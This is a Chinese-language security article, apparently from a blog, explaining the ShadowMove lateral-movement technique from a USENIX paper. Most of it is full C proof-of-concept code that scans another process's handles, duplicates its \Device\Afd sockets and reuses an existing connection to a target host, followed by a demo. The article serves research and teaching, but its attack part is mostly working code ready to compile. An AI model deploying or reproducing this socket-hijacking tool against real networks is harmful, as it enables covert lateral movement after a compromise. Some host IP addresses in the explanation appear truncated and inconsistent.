![](https://image.3001.net/images/20210207/1612686114_601fa32248eff9f7706ba.jpg!small)

## 写在前面的话

ShadowMove是一种横向渗透技术，研究人员Niakanlahiji、Jinpeng Wei、Md Rabbi Alam、Qingyang
Wang和Bei Tseng Chu在他们发表的原始论文中详细介绍过这种技术，感兴趣的同学可以点击【[
_这里_](https://www.usenix.org/system/files/sec20summer_niakanlahiji_prepub.pdf)】查看技术详情。ShadowMove可以通过窃取或复制连接到一台远程主机的现有Socket，入侵正在运行相关进程的目标系统。

在这篇文章中，我们将快速演示这项技术的使用，并提供研究人员[ _Juan Manuel
Fernández_](https://www.twitter.com/@TheXC3LL)发表的[
_概念验证PoC_](https://adepts.of0x.cc/shadowmove-hijack-socket/)。

## 技术概览

下图显示的是这项技术工作机制的简单流程图，以及我们如何在自己的实验环境中进行测试。在下图中，我们使用了ShadowMove技术在源主机和目标主机之间进行通信：

![](https://image.3001.net/images/20210207/1612686126_601fa32e323243a5ca848.png!small)

 **我跟大家解释一下上面这张图的具体情况：**

>
> 在上图的左边部分，我们有一台被入侵的主机（比如说，我们通过钓鱼攻击入侵了这台主机），IP地址为168.1.117。这台主机就是我们需要开始横向渗透的源主机，我们需要利用它来攻击IP地址为192.168.56.102的主机。
>
> 在右边部分，是我们的目标主机，IP地址为168.56.102，这台主机在TCP端口80有一个正在监听的Socket，运行命令为“nc -lvp 80”。
>
> 源主机168.1.117已经与我们的目标主机192.168.56.102:80通过nc.exe建立了连接。
>
>
> 在源主机上，有一个名为exe的正在运行的进程。这个进程将负责执行ShadowMove横向渗透操作。需要注意的是，它在整个生命周期中并不会跟远程主机建立任何连接，这也是这项技术的独特魅力所在。
>
>
> 在源主机上，exe会枚举所有跟nc.exe和\Device\Afd相关的处理程序，并用于网络Socket通信。找到之后，该进程将使用这些处理程序并调用WSADuplicateSocketW和WSASocket这两个API来复制Socket。创建好共享Socket之后，进程将会使用getpeername来判断Socket的目标地址是否为目标主机的IP地址，即192.168.56.102。
>
> 当基于\Device\Afd的指向目标主机的共享Socket创建之后，exe将能够使用send API向Socket中写入数据，或使用recv
> API来从中读取数据。

再次强调一点，ShadowMove.exe并不会创建任何指向目标主机的TCP链接。相反，它会直接复用源主机和目标主机之间（192.168.56.102:80）的现有的Socket，这也是该横向渗透技术的关键之处。

## PoC代码

下面给出的是由安全专家[ _Juan Manuel Fernánde_](https://www.twitter.com/@TheXC3LL)z提供的[
_PoC代码_](https://adepts.of0x.cc/shadowmove-hijack-socket/)，为了在Visual Studio
2019的开发环境中完成代码编译，本人对其进行了部分修改：

    
    
    // PoC of ShadowMove Gateway by Juan Manuel Fernández (@TheXC3LL)
    
     
    
    #define _WINSOCK_DEPRECATED_NO_WARNINGS
    
    #include <winsock2.h>
    
    #include <Windows.h>
    
    #include <stdio.h>
    
     
    
    #pragma comment(lib,"WS2_32")
    
     
    
    // Most of the code is adapted from https://github.com/Zer0Mem0ry/WindowsNT-Handle-Scanner/blob/master/FindHandles/main.cpp
    
    #define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
    
    #define SystemHandleInformation 16
    
    #define ObjectNameInformation 1
    
     
    
    typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
    
    ULONG SystemInformationClass,
    
    PVOID SystemInformation,
    
    ULONG SystemInformationLength,
    
    PULONG ReturnLength
    
    );
    
    typedef NTSTATUS(NTAPI* _NtDuplicateObject)(
    
    HANDLE SourceProcessHandle,
    
    HANDLE SourceHandle,
    
    HANDLE TargetProcessHandle,
    
    PHANDLE TargetHandle,
    
    ACCESS_MASK DesiredAccess,
    
    ULONG Attributes,
    
    ULONG Options
    
    );
    
    typedef NTSTATUS(NTAPI* _NtQueryObject)(
    
    HANDLE ObjectHandle,
    
    ULONG ObjectInformationClass,
    
    PVOID ObjectInformation,
    
    ULONG ObjectInformationLength,
    
    PULONG ReturnLength
    
    );
    
     
    
    typedef struct _SYSTEM_HANDLE
    
    {
    
    ULONG ProcessId;
    
    BYTE ObjectTypeNumber;
    
    BYTE Flags;
    
    USHORT Handle;
    
    PVOID Object;
    
    ACCESS_MASK GrantedAccess;
    
    } SYSTEM_HANDLE, * PSYSTEM_HANDLE;
    
     
    
    typedef struct _SYSTEM_HANDLE_INFORMATION
    
    {
    
    ULONG HandleCount;
    
    SYSTEM_HANDLE Handles[1];
    
    } SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
    
     
    
    typedef struct _UNICODE_STRING
    
    {
    
    USHORT Length;
    
    USHORT MaximumLength;
    
    PWSTR Buffer;
    
    } UNICODE_STRING, * PUNICODE_STRING;
    
     
    
     
    
    typedef enum _POOL_TYPE
    
    {
    
    NonPagedPool,
    
    PagedPool,
    
    NonPagedPoolMustSucceed,
    
    DontUseThisType,
    
    NonPagedPoolCacheAligned,
    
    PagedPoolCacheAligned,
    
    NonPagedPoolCacheAlignedMustS
    
    } POOL_TYPE, * PPOOL_TYPE;
    
     
    
    typedef struct _OBJECT_NAME_INFORMATION
    
    {
    
    UNICODE_STRING Name;
    
    } OBJECT_NAME_INFORMATION, * POBJECT_NAME_INFORMATION;
    
     
    
    PVOID GetLibraryProcAddress(const char *LibraryName, const char *ProcName)
    
    {
    
    return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
    
    }
    
     
    
    SOCKET findTargetSocket(DWORD dwProcessId, LPSTR dstIP) {
    
    HANDLE hProc;
    
    PSYSTEM_HANDLE_INFORMATION handleInfo;
    
    DWORD handleInfoSize = 0x10000;
    
    NTSTATUS status;
    
    DWORD returnLength;
    
    WSAPROTOCOL_INFOW wsaProtocolInfo = { 0 };
    
    SOCKET targetSocket;
    
     
    
    // Open target process with PROCESS_DUP_HANDLE rights
    
    hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwProcessId);
    
    if (!hProc) {
    
    printf("[!] Error: could not open the process!\n");
    
    exit(-1);
    
    }
    
    printf("[+] Handle to process obtained!\n");
    
     
    
    // Find the functions
    
    _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetLibraryProcAddress("ntdll.dll", "NtQuerySystemInformation");
    
    _NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetLibraryProcAddress("ntdll.dll", "NtDuplicateObject");
    
    _NtQueryObject NtQueryObject = (_NtQueryObject)GetLibraryProcAddress("ntdll.dll", "NtQueryObject");
    
     
    
    // Retrieve handles from the target process
    
    handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
    
    while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
    
    handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
    
     
    
    printf("[+] Found [%d] handles in PID %d\n============================\n", handleInfo->HandleCount, dwProcessId);
    
     
    
    // Iterate
    
    for (DWORD i = 0; i < handleInfo->HandleCount; i++) {
    
     
    
    // Check if it is the desired type of handle
    
    if (handleInfo->Handles[i].ObjectTypeNumber == 0x24) {
    
     
    
    SYSTEM_HANDLE handle = handleInfo->Handles[i];
    
    HANDLE dupHandle = NULL;
    
    POBJECT_NAME_INFORMATION objectNameInfo;
    
     
    
    // Duplicate handle
    
    NtDuplicateObject(hProc, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, PROCESS_ALL_ACCESS, FALSE, DUPLICATE_SAME_ACCESS);
    
    objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
    
     
    
    // Get handle info
    
    NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
    
     
    
    // Narow the search checking if the name length is correct (len(\Device\Afd) == 11 * 2)
    
    if (objectNameInfo->Name.Length == 22) {
    
    printf("[-] Testing %d of %d\n", i, handleInfo->HandleCount);
    
     
    
    // Check if it ends in "Afd"
    
    LPWSTR needle = (LPWSTR)malloc(8);
    
    memcpy(needle, objectNameInfo->Name.Buffer + 8, 6);
    
    if (needle[0] == 'A' && needle[1] == 'f' && needle[2] == 'd') {
    
     
    
    // We got a candidate
    
    printf("\t[*] \\Device\\Afd found at %d!\n", i);
    
     
    
    // Try to duplicate the socket
    
    status = WSADuplicateSocketW((SOCKET)dupHandle, GetCurrentProcessId(), &wsaProtocolInfo);
    
    if (status != 0) {
    
    printf("\t\t[X] Error duplicating socket!\n");
    
    free(needle);
    
    free(objectNameInfo);
    
    CloseHandle(dupHandle);
    
    continue;
    
    }
    
     
    
    // We got it?
    
    targetSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, &wsaProtocolInfo, 0, WSA_FLAG_OVERLAPPED);
    
    if (targetSocket != INVALID_SOCKET) {
    
    struct sockaddr_in sockaddr;
    
    DWORD len;
    
    len = sizeof(SOCKADDR_IN);
    
     
    
    // It this the socket?
    
    if (getpeername(targetSocket, (SOCKADDR*)&sockaddr, (int*)&len) == 0) {
    
    if (strcmp(inet_ntoa(sockaddr.sin_addr), dstIP) == 0) {
    
    printf("\t[*] Duplicated socket (%s)\n", inet_ntoa(sockaddr.sin_addr));
    
    free(needle);
    
    free(objectNameInfo);
    
    return targetSocket;
    
    }
    
    }
    
     
    
    }
    
     
    
    free(needle);
    
    }
    
     
    
    }
    
    free(objectNameInfo);
    
     
    
    }
    
    }
    
     
    
    return 0;
    
    }
    
     
    
     
    
    int main(int argc, char** argv) {
    
    WORD wVersionRequested;
    
    WSADATA wsaData;
    
    DWORD dwProcessId;
    
    LPSTR dstIP = NULL;
    
    SOCKET targetSocket;
    
    char buff[255] = { 0 };
    
     
    
    printf("\t\t\t-=[ ShadowMove Gateway PoC ]=-\n\n");
    
     
    
    // smgateway.exe [PID] [IP dst]
    
    /* It's just a PoC, we do not validate the args. But at least check if number of args is right X) */
    
    if (argc != 3) {
    
    printf("[!] Error: syntax is %s [PID] [IP dst]\n", argv[0]);
    
    exit(-1);
    
    }
    
    dwProcessId = strtoul(argv[1], NULL, 10);
    
    dstIP = (LPSTR)malloc(strlen(argv[2]) * (char)+1);
    
    memcpy(dstIP, argv[2], strlen(dstIP));
    
     
    
     
    
    // Classic
    
    wVersionRequested = MAKEWORD(2, 2);
    
    WSAStartup(wVersionRequested, &wsaData);
    
     
    
    targetSocket = findTargetSocket(dwProcessId, dstIP);
    
    send(targetSocket, "hello from shadowmove and reused socket!\n", strlen("hello from shadowmove and reused socket!\n"), 0);
    
    recv(targetSocket, buff, 255, 0);
    
    printf("\n[*] Message from target to shadowmove:\n\n %s\n", buff);
    
    return 0;
    
    }

## 演示样例

编译好上述代码之后，我们就可以进行测试了。在下面的演示样例中，我们演示了ShadowMove横向渗透技术的实践场景：

![](https://image.3001.net/images/20210207/1612686163_601fa3532d14964fe381e.gif)

## 参考资料

  * [ _https://www.usenix.org/system/files/sec20summer_niakanlahiji_prepub.pdf_](https://www.usenix.org/system/files/sec20summer_niakanlahiji_prepub.pdf)

